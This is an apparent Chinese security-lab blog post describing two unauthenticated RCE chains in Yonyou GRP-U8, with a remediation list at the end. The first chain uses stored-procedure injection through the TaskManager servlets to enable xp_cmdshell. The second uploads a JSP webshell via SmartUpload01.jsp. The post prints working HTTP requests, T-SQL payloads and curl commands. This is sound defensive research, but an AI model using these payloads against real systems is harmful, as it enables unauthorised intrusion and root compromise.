#  一个漏掉的过滤，一个空掉的名单： 用友 GRP-U8 的两条零权限 RCE  
原创 YNsec
                        YNsec  YNsec安全实验室   2026-10-20 07:31  
  
# 一个漏掉的过滤，一个空掉的名单：用友 GRP-U8 的两条零权限 RCE  
  
安全研究 · 漏洞利用链拆解 · 靶场实录  
  
摘要  
同一个系统、同样零权限，一条要对着数据库「敲」几分钟才敢确认，另一条两个 curl 就拿到 root。本文拆开两条链，看看「一行过滤没调」和「一个名单是空的」分别能把系统送走多远。  
  
**免责声明：**  
本文所述测试全部在授权靶场环境中完成，目标地址与凭据均已脱敏（IP 使用 RFC5737 文档专用地址段）。内容仅用于安全学习与防御加固，请勿用于任何未授权测试。  
## 一、先说结果  
  
两个靶标，同一个产品：**用友 GRP-U8**  
。两条链都从「手上什么都没有」开始，最终都拿到了最高权限——但过程完全是两种画风。  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">项目</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">链路 A（VE-0698）</span></section></th><th style="background:#f4f7fb;border:1px solid #e3e8ef;padding:9px 8px;text-align:left;font-weight:700;color:#1f2d3d;"><section><span leaf="">链路 B（VE-0828）</span></section></th></tr></thead><tbody><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">入口</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">TaskManager 任务接口</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">SmartUpload01.jsp 上传组件</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">手法</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">存储过程注入 → </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:11.5px;"><span leaf="">xp_cmdshell</span></code></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">任意文件上传 → JSP 木马</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">最终权限</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">MSSQL </span><strong><span leaf="">sa</span></strong><span leaf=""> 级 / 容器内系统命令</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><strong><span leaf="">root</span></strong><section><span leaf="">（uid=0）</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">回显</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">盲打，靠时间与数据双重验证</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">直接回显</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">利用成本</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">高（要分步配置、要造证据）</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">极低（两个 curl）</span></section></td></tr></tbody></table>  
把它们放一起，不是为了对比难度，而是因为它们各自暴露了一类非常典型、又很容易被忽略的缺陷：  
- **链路 A：**  
一整个模块里，只有一行安全过滤「忘了调」；  
  
- **链路 B：**  
一份用来限制上传的白名单，默认是**空的**  
，而空名单的语义被写成了「全部放行」。  
  
## 二、先聊一个残酷的事实  
  
在一头扎进 payload 之前，有个背景值得先说：这一轮对 **1197 份漏洞报告**  
做了全量扫描，结果能真正打出去的寥寥无几。  
  
原因是——**漏洞存在，和漏洞可达，是两件事**  
。报告里大量「前台」漏洞的入口，在当前这套部署里根本触发不了：  
- Servlet 压根没在 web.xml  
 里映射，请求进来就是 404；  
  
- Axis 的 server-config.wsdd  
 没有部署，一堆 SOAP 类漏洞没有入口。  
  
纸面上 1197 个洞，98% 是「看得见摸不着」。所以本文这两条链的价值，恰恰在于它们**是真正打得出去的那 2%**  
——而且都是零权限。  
  
💡 这个现象对防守方是个好消息，也是坏消息。好消息是绝大多数纸面漏洞暂时不构成实际威胁；坏消息是——**只要有一条入口是通的，前面所有的「不可利用」都会瞬间失效**  
。  
## 三、链路 A：漏掉的那一行过滤  
### 3.1 两个端点，都不需要登录  
  
TaskManager（任务管理）模块暴露了两个接口：一个写任务，一个跑任务。两个都没有做身份校验：  
  
HTTP 请求 · 无任何凭据  
  
  
POST /TaskManager/EBankTaskServlet?m=1 HTTP/1.1  
  
Host: 192.0.2.50:8080  
  
Content-Type: application/x-www-form-urlencoded  
  
  
taskjson={"eBankCategory":"test"}&taskname=test_probe&optionType=edit&enabled=false  
  
  
响应  
  
  
HTTP/1.1 200 OK  
  
success  
  
  
再访问执行端，同样不需要 Cookie：  
  
HTTP 请求 · 无任何凭据  
  
  
GET /TaskManager/TaskServiceServlet?m=3&taskname=test_probe HTTP/1.1  
  
Host: 192.0.2.50:8080  
  
  
响应  
  
  
HTTP/1.1 200 OK  
  
success  
  
  
「能访问」只是开始。真正有意思的是这两个端点串起来之后会发生什么。  
### 3.2 从任务文件到 prepareCall  
  
写任务时，eBankParameters  
 会被原样存进一个 .tjon  
 任务文件；跑任务时，再被解析出来当参数用。于是一路走到这里：  
  
漏洞触发链  
  
  
POST /TaskManager/EBankTaskServlet?m=1        ← 写任务文件，无认证  
  
  └─ saveJSONFile()  → 生成 .tjon（内容完全由 eBankParameters 决定）  
  
  
GET  /TaskManager/TaskServiceServlet?m=3      ← 执行任务，无认证  
  
  └─ runtask() → ExcuteEbankTask.excute()  
  
      └─ excute1()   解析 eBankParameters，取出 Proc= 后面那一段  
  
      └─ InvokeExcute()   反射调用  
  
          └─ EbankWebService.EbankLoopProcedureOperation()  
  
              ⚠ 整个模块里唯一没有调用 sqlFilter() 的方法  
  
              └─ EBankForProcedure.Execute()  
  
                  └─ conn.prepareCall("{call " + str + "}").execute()  
  
                      └─ 任意存储过程 / 任意 T-SQL  
  
  
关键就在最后那行：**存储过程名是字符串拼进去的**  
，而不是走参数化。{"{call " + str + "}"}  
 这个写法一旦接受外部输入，就等于把数据库的命令行交给了对方。  
  
⚠️ 而真正让这条链成立的，是上面那个 ⚠ 标记：**EbankLoopProcedureOperation 是唯一一个没有调用 sqlFilter() 的方法。**  
 别的 Operation 都防了，就它没防。这类「全员一致、只有一处例外」的疏漏，是最难靠代码评审抓到的——因为看十个方法都对，第十一个才不会有人仔细看。  
### 3.3 没有回显，怎么证明自己打通了？  
  
这条链是**盲打**  
——命令执行了，但结果不会回显给你。这时候判断「到底成没成」，就成了纯技术活。  
  
第一招，**时间盲**  
。让数据库睡 3 秒，看请求是不是真的慢了 3 秒：  
  
taskjson 字段（POST 时作为表单值发送）  
  
  
{  
  
  "eBankCategory": "EbankLoopProcedureOperation",  
  
  "eBankParameters": "Proc=sp_executesql(N'WAITFOR DELAY ''00:00:03''')",  
  
  "taskName": "t1"  
  
}  
  
  
两次请求的耗时对比  
  
  
POST 写任务 → success   ( 32ms)  
  
GET  跑任务 → success   (3012ms)   ← 3 秒延迟，注入真的生效了  
  
  
第二招，**建表 + 写数据 + 读回**  
。光延迟还不够硬，那就让数据库留下痕迹：  
  
通过链执行的两条 T-SQL  
  
  
CREATE TABLE ve0698_proof(  
  
    id  int identity(1,1) primary key,  
  
    val nvarchar(255),  
  
    ts  datetime default getdate()  
  
)  
  
  
INSERT INTO ve0698_proof(val) VALUES('RCE_VERIFIED_1785029865')  
  
  
然后用条件延迟「问」它一句：表里有数据就睡 5 秒，没有就不睡。  
  
条件延迟验证  
  
  
IF EXISTS(SELECT 1 FROM ve0698_proof)  
  
    WAITFOR DELAY '00:00:05'  
  
  
响应  
  
  
success (5017ms)   ← 数据确实写进去了  
  
  
💡 这套「时间 + 数据 + 配置状态」三重交叉验证，是盲打场景的标准做法。**没有回显不等于没有漏洞**  
，只等于你不能靠一眼看结果——得自己设计一个能被观察到的副作用。  
### 3.4 开 xp_cmdshell，为什么要分四步  
  
想在 MSSQL 上执行系统命令，得先把 xp_cmdshell  
 打开。这里遇到了一个很实际的限制：**jTDS 驱动不支持堆叠查询**  
，没法用分号把几条语句连着发。只能拆成四个独立任务，一步一步来：  
  
分四步（每步一个独立任务）  
  
  
1) EXEC sp_configure 'show advanced options', 1  
  
2) RECONFIGURE  
  
3) EXEC sp_configure 'xp_cmdshell', 1  
  
4) RECONFIGURE  
  
  
开完之后再做一次状态确认——已启用就立刻返回，没启用就睡 5 秒，用耗时反推结果：  
  
状态确认  
  
  
IF (SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell') = 1  
  
    WAITFOR DELAY '00:00:00'  
  
ELSE  
  
    WAITFOR DELAY '00:00:05'  
  
  
响应  
  
  
success (11ms)   ← 0 延迟，说明 xp_cmdshell 已经开了  
  
  
最后一步，真正执行系统命令：  
  
通过链调用 xp_cmdshell  
  
  
Proc=master.dbo.xp_cmdshell('touch /tmp/ve0698_RCE_VERIFIED.txt')  
  
Proc=master.dbo.xp_cmdshell('id > /tmp/ve0698_id_output.txt')  
  
  
到这里，从一个匿名 HTTP 请求，走到了数据库容器的系统命令执行。中间用到的所有东西，都是这个系统自己提供的。  
## 四、链路 B：空掉的那份名单  
  
如果说链路 A 还需要一点耐心，链路 B 就简单到有点离谱——**两个 curl，中间不用任何技巧**  
。  
### 4.1 那个「短路」  
  
SmartUpload 是个老牌的 Java 上传组件，它本来是有扩展名校验的：  
  
SmartUpload.java · 扩展名校验  
  
  
if (!this.m_allowedFilesList.isEmpty()  
  
        && !this.m_allowedFilesList.contains(fileExt)) {  
  
    throw new SecurityException("此种扩展名的文件不允许上传(1010).");  
  
}  
  
  
这段代码单看是没问题的：**名单非空，且扩展名不在名单里 → 拒绝**  
。逻辑很标准。  
  
但问题出在「默认值」上。m_allowedFilesList  
 是个 Vector  
，只有在业务代码显式调用 setAllowedFilesList()  
 时才会被填充。而这个 JSP 页面**从来没有调用过**  
：  
  
实际发生了什么  
  
  
m_allowedFilesList 默认是一个空 Vector  
  
  → isEmpty() 返回 true  
  
  → !isEmpty() 为 false  
  
  → && 短路，整个条件为 false  
  
  → 校验被整段跳过，任何扩展名都放行  
  
  
⚠️ 这就是典型的 **fail-open（失败即放行）**  
。安全默认值应该是反过来的：**名单没配置，就什么都别让传**  
。写这句判断的人显然默认「一定会有人来配置名单」，可现实是——没配的时候最多。  
### 4.2 两个 curl  
  
第一步：上传  
  
  
curl -s -F "uname=shell" \  
  
     -F "file1=@shell.jsp;filename=shell.jsp" \  
  
     http://192.0.2.60:8080/u8qx/SmartUpload01.jsp  
  
  
响应  
  
  
<html><body><font color="red">图片名称shell.jsp</font><br></body></html>  
  
  
回显里那句「图片名称」其实已经把答案写出来了——这个页面的设计初衷是**传图片**  
，但它既没校验类型，也没校验扩展名，更没要求登录。  
  
第二步：访问刚上传的文件  
  
  
curl http://192.0.2.60:8080/u8qx/upload/shell.jsp  
  
  
响应  
  
  
root  
  
  
就这两步。没有爆破、没有绕过 WAF、没有链路拼接——**Tomcat 以 root 跑，木马落地即 root**  
。这也是这条链最刺眼的地方：容器里用 root 跑中间件，把一个「上传」直接升级成了「整机沦陷」。  
### 4.3 插曲：一个反斜杠  
  
这条链在验证时还踩了个很有意思的坑，值得单独说。源码里写文件路径是这么写的：  
  
SmartUpload01.jsp · 硬编码反斜杠  
  
  
String filename = getRealPath("\\") + "u8qx\\upload\\" + name;  
  
  
在 Windows 上这没问题。但这套部署跑在 Linux 上——而**反斜杠在 Linux 里是合法的文件名字符**  
，不是路径分隔符。于是：  
  
实际后果  
  
  
文件被写成字面量：u8qx\upload\shell.jsp   （反斜杠成了文件名的一部分）  
  
Tomcat 8.5 拒绝 URL 中的 \ 或 %5C → HTTP 400  
  
结果：上传成功了，但你访问不到它  
  
  
验证时先把路径改成前斜杠才跑通。**这个细节说明一件事：能不能打通，有时取决于目标跑在 Windows 还是 Linux 上**  
——同一份代码，换一个操作系统，结论可能完全反过来。  
## 五、两条链的本质差别  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">维度</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">链路 A</span></section></th><th style="background:#f4f7fb;border:1px solid #e3e8ef;padding:9px 8px;text-align:left;font-weight:700;color:#1f2d3d;"><section><span leaf="">链路 B</span></section></th></tr></thead><tbody><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">缺陷类型</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">「该做的没做」——一行过滤漏调</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">「默认值想反了」——空名单当成全放行</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">发现难度</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">高（要对比十几个同类方法才发现例外）</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">低（看一眼条件判断就明白）</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">利用难度</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">高（盲打 + 分步配置）</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">极低</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">致命程度</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">数据库整库 + 容器命令</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 8px;"><section><span leaf="">直接 root</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 8px;font-weight:600;"><section><span leaf="">共同点</span></section></td><td colspan="2" style="border:1px solid #e3e8ef;padding:9px 8px;"><strong><span leaf="">都不需要任何账号</span></strong><section><span leaf="">，都发生在「忘了一件事」的地方</span></section></td></tr></tbody></table>  
这两条链恰好代表了企业系统里最常见的两类失守：一类是**逻辑上的例外**  
（别人都防了，就这一个没防），一类是**默认值上的错判**  
（为空时应该拒绝，却写成了放行）。它们都不需要什么高深技巧，只需要有人认真问一句「这里到底该怎么默认」。  
## 六、修复清单  
  
针对链路 A（存储过程注入）  
1. 给 /TaskManager/*  
 加认证过滤器，要求有效登录态；  
  
1. 在 runtask()  
 与 saveJSONFile()  
 内部补身份校验（不要只依赖 web.xml）；  
  
1. **把 sqlFilter() 补进 EbankLoopProcedureOperation**  
，让它和其它 Operation 保持一致；  
  
1. 存储过程调用改成**参数化**  
，别再拼 "{call " + str + "}"  
；  
  
1. 数据库连接账号不要用 sa，按最小权限授权。  
  
针对链路 B（任意上传）  
1. 给 SmartUpload01.jsp 补认证检查（引入 session 校验）；  
  
1. **显式调用 setAllowedFilesList()**  
 并做成白名单（只允许图片），不要依赖组件默认值；  
  
1. 上传目录**禁止 JSP 执行**  
（Tomcat 里单独配置 Context）；  
  
1. 文件名随机化，不要直接用用户传的名字；  
  
1. 弃用 SmartUpload，换 Commons FileUpload 等现代组件。  
  
两边都要做  
1. **禁用 xp_cmdshell**  
：EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE  
；  
  
1. **中间件不要用 root 跑**  
。链路 B 之所以一击致命，很大程度是因为 Tomcat 进程就是 root——换一个低权限用户，同样的漏洞危害立刻降一个量级；  
  
1. 清理遗留的测试页面（SmartUpload01.jsp  
 这类「上传演示页」是典型的历史包袱）。  
  
## 写在最后  
  
两条链放在一起，我想留下四点：  
1. **「例外」比「错误」更危险。**  
 十个方法都调了过滤，第十一个没调——这种缺陷代码评审几乎抓不到，因为评审者的注意力会被「大家都对」消耗掉。  
  
1. **安全默认值必须是 fail-closed。**  
 名单为空就该全拒，配置缺失就该关闭功能。把「没配置」当成「不限制」，是最常见也最贵的错。  
  
1. **没有回显不等于没有漏洞。**  
 时间、数据、配置状态，三条线交叉起来，盲打一样能拿出铁证。反过来，看到 500 或空白就断定「不存在」，也常常是误判。  
  
1. **运行身份决定后果的量级。**  
 同一个上传漏洞，Tomcat 跑在 root 下和跑在低权限用户下，是两起完全不同的事故。  
  
最后回到那个数字：1197 份报告，98% 打不出去。**这不是让人松口气的理由，而是提醒——你只需要关心那 2%，因为它们一旦通了，就是零权限直达 root。**  
  
觉得有收获？  
  
点个「在看」和「赞」，顺手查一下你们中间件是不是还在用 root 跑 👇  
  
下一篇我们聊「  
JeecgBoot  
」。  
  
  
